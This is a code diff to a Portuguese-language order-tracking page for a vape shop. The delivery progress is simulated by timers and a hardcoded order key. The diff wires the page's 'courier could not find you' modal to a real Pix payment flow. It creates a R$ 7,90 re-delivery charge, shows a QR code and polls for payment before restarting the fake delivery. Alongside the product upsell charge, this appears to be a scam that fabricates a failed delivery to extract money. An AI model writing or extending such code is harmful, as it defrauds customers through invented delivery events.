@@ -94,6 +94,15 @@
 		.modal { width: min(100%, 420px); padding: 29px; border-radius: 18px; background: #fff; text-align: center; box-shadow: 0 18px 55px rgba(0,0,0,.25); }
 		.modal-icon { display: grid; place-items: center; width: 56px; height: 56px; margin: 0 auto 15px; border-radius: 50%; color: var(--orange); background: #fff0e6; font-size: 25px; font-weight: 700; }
 		.modal h2 { font-size: 22px; } .modal p { margin: 0 0 21px; color: var(--muted); font-size: 14px; line-height: 1.5; }
+		.resend-pix { display: none; margin: -4px 0 18px; padding: 12px; border: 1px solid var(--line); border-radius: 10px; background: #f7faf8; text-align: left; }
+		.resend-pix.visible { display: block; }
+		.resend-pix img { display: block; width: 150px; height: 150px; margin: 0 auto 10px; padding: 5px; background: #fff; object-fit: contain; }
+		.resend-pix strong, .resend-pix small { display: block; }
+		.resend-pix strong { margin-bottom: 4px; font-size: 13px; }
+		.resend-pix small { margin-bottom: 7px; color: var(--muted); font-size: 11px; }
+		.resend-pix code { display: block; max-height: 70px; padding: 7px; overflow: auto; overflow-wrap: anywhere; border: 1px solid var(--line); border-radius: 6px; color: var(--muted); background: #fff; font-family: monospace; font-size: 10px; line-height: 1.35; }
+		.resend-copy { margin-top: 7px; padding: 7px 10px; border: 0; border-radius: 6px; color: #fff; background: var(--green); cursor: pointer; font-size: 11px; font-weight: 700; }
+		.resend-notice { display: block; min-height: 16px; margin-top: 6px; color: var(--green); font-size: 11px; font-weight: 700; }
 		@media (max-width: 600px) { .topbar { height: 60px; } .page { padding-top: 32px; } .intro { align-items: flex-start; } h1 { font-size: 29px; } .eta strong { font-size: 27px; } .map { height: 205px; } .inside { padding: 20px 15px; } h2 { font-size: 18px; } .steps { gap: 2px; } .step { font-size: 10px; } .step:before { width: 26px; height: 26px; margin-bottom: 6px; } .tools { align-items: flex-start; flex-direction: column; } }
 	</style>
 </head>
@@ -115,7 +124,7 @@
 			</div>
 		</section>
 	</main>
-	<div class="backdrop" id="modal" role="dialog" aria-modal="true" aria-labelledby="modal-title"><div class="modal"><div class="modal-icon">!</div><h2 id="modal-title">O motoboy não encontrou você</h2><p>Ele aguardou no endereço, mas você não apareceu. Será necessário pagar uma taxa de reenvio de R$ 7,90 caso você não retire a encomenda no endereço.</p><button class="button" id="resend" type="button">Pagar taxa de reenvio</button></div></div>
+	<div class="backdrop" id="modal" role="dialog" aria-modal="true" aria-labelledby="modal-title"><div class="modal"><div class="modal-icon">!</div><h2 id="modal-title">O motoboy não encontrou você</h2><p>Ele aguardou no endereço, mas você não apareceu. Será necessário pagar uma taxa de reenvio de R$ 7,90 caso você não retire a encomenda no endereço.</p><div class="resend-pix" id="resend-pix"><img id="resend-qr-code" alt="QR Code Pix da taxa de reenvio" width="150" height="150"><strong>Pix da taxa de reenvio: R$ 7,90</strong><small>Escaneie o QR Code ou copie o código para pagar.</small><code id="resend-pix-code"></code><button class="resend-copy" id="resend-copy" type="button">Copiar código Pix</button><span class="resend-notice" id="resend-notice" role="status" aria-live="polite"></span></div><button class="button" id="resend" type="button">Pagar taxa de reenvio</button></div></div>
 	<script>
 		(function () {
 			const stages = [
@@ -128,7 +137,7 @@
 			const minute = 60 * 1000, totalEstimated = 25, storageKey = "pedido-2481-entrega";
 			const upsellDuration = 5 * minute;
 			const upsellAmount = 1721;
-			let stage = 0, elapsed = 0, interval, deliveryState, upsellPurchased = false, upsellReference = '';
+			let stage = 0, elapsed = 0, interval, deliveryState, upsellPurchased = false, upsellReference = '', resendReference = '', resendPolling;
 			const $ = id => document.getElementById(id);
 			const stageEls = [...document.querySelectorAll(".step")];
 			function loadState() {
@@ -182,9 +191,27 @@
 				$("upsell-pix-code").textContent = codigo;
 				const polling = setInterval(async () => { try { const statusResponse = await fetch('/api/pix/status?reference=' + encodeURIComponent(upsellReference)); const statusDados = await statusResponse.json(); if (statusDados.status === 'approved') { clearInterval(polling); $("upsell-confirmation").textContent = 'Pagamento do Ignite V40 confirmado! Ele foi incluído no seu pedido.'; $("upsell-confirmation").classList.add('visivel'); } } catch (error) { console.warn('Polling do upsell falhou', error); } }, 5000);
 			}
+			async function gerarPixReenvio() {
+				let customer = { name: 'Cliente Vapewave', email: 'cliente@vapewave.local', phone: '11999999999', document: '00000000000' };
+				try { customer = JSON.parse(localStorage.getItem('vapewave-pix-customer')) || customer; } catch (error) { console.warn('Dados do cliente indisponíveis', error); }
+				resendReference = 'VAPEWAVE-REENVIO-' + Date.now() + '-' + Math.floor(Math.random() * 10000);
+				const resposta = await fetch('/api/pix/create', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ amount: 790, description: 'Taxa de reenvio Vapewave', reference: resendReference, source: 'api_externa', offer_link: window.location.origin + window.location.pathname, customer: customer, meta: { valor: 7.90, origem: 'taxa-reenvio' } }) });
+				const dados = await resposta.json();
+				if (!resposta.ok || !dados.ok || !(dados.qr_code || dados.pix_code)) throw new Error(dados.error || 'Não foi possível gerar o Pix da taxa.');
+				const codigo = dados.qr_code || dados.pix_code;
+				const imagem = dados.qr_code_base64 ? (dados.qr_code_base64.indexOf('data:image') === 0 ? dados.qr_code_base64 : 'data:image/png;base64,' + dados.qr_code_base64) : 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent(codigo);
+				$('resend-qr-code').src = imagem;
+				$('resend-qr-code').onerror = function () { this.onerror = null; this.src = 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent(codigo); };
+				$('resend-pix-code').textContent = codigo;
+				resendPolling = setInterval(async function () { try { const statusResponse = await fetch('/api/pix/status?reference=' + encodeURIComponent(resendReference)); const statusDados = await statusResponse.json(); if (statusDados.status === 'approved') { clearInterval(resendPolling); iniciarReenvio(); } } catch (error) { console.warn('Polling da taxa de reenvio falhou', error); } }, 5000);
+			}
+			function iniciarReenvio() {
+				$('resend').disabled = true; $('resend').textContent = 'Pagamento confirmado'; $('resend-pix').classList.remove('visible'); $('status-title').textContent = 'Retornando para a loja'; $('status-copy').textContent = 'Pagamento confirmado. O novo envio começa em 1 minuto.'; $('map-label').textContent = 'Retornando para loja'; $('rider').style.left = '17%'; deliveryState = { returnStartedAt: Date.now() }; saveState(); setTimeout(function () { deliveryState = { startedAt: Date.now() }; saveState(); stage = 0; elapsed = 0; $('modal').classList.remove('open'); $('resend').disabled = false; $('resend').textContent = 'Pagar taxa de reenvio'; render(); start(); }, minute);
+			}
 			$("upsell-button").addEventListener("click", async function () { upsellPurchased = true; const offer = $("upsell-offer"); offer.classList.add("expandida"); this.textContent = "Gerando Pix..."; this.disabled = true; try { await gerarPixUpsell(); this.textContent = "Pix gerado"; } catch (error) { this.textContent = "Tentar novamente"; this.disabled = false; $("upsell-pix-code").textContent = error.message; } });
 			$("upsell-copy-button").addEventListener("click", async function () { const codigo = $("upsell-pix-code").textContent; try { await navigator.clipboard.writeText(codigo); $("upsell-copy-notice").textContent = "Código Pix copiado!"; this.textContent = "Código copiado"; } catch (error) { $("upsell-copy-notice").textContent = "Selecione o código para copiar."; } });
-			$("resend").addEventListener("click", function () { $("resend").disabled = true; $("resend").textContent = "Motoboy retornando à loja..."; $("status-title").textContent = "Retornando para a loja"; $("status-copy").textContent = "A taxa foi registrada. O novo envio começa em 1 minuto."; $("map-label").textContent = "Retornando para loja"; $("rider").style.left = "17%"; deliveryState = { returnStartedAt: Date.now() }; saveState(); setTimeout(function () { deliveryState = { startedAt: Date.now() }; saveState(); stage = 0; elapsed = 0; $("modal").classList.remove("open"); $("resend").disabled = false; $("resend").textContent = "Pagar taxa de reenvio"; render(); start(); }, minute); });
+			$("resend").addEventListener("click", async function () { this.disabled = true; this.textContent = "Gerando Pix..."; $("resend-pix").classList.add("visible"); try { await gerarPixReenvio(); this.textContent = "Aguardando pagamento"; } catch (error) { this.textContent = "Tentar novamente"; this.disabled = false; $("resend-pix-code").textContent = error.message; } });
+			$("resend-copy").addEventListener("click", async function () { const codigo = $("resend-pix-code").textContent; try { await navigator.clipboard.writeText(codigo); $("resend-notice").textContent = "Código Pix copiado!"; this.textContent = "Código copiado"; } catch (error) { $("resend-notice").textContent = "Selecione o código para copiar."; } });
 			if (loadState()) { saveState(); render(); start(); }
 		}());
 	</script>
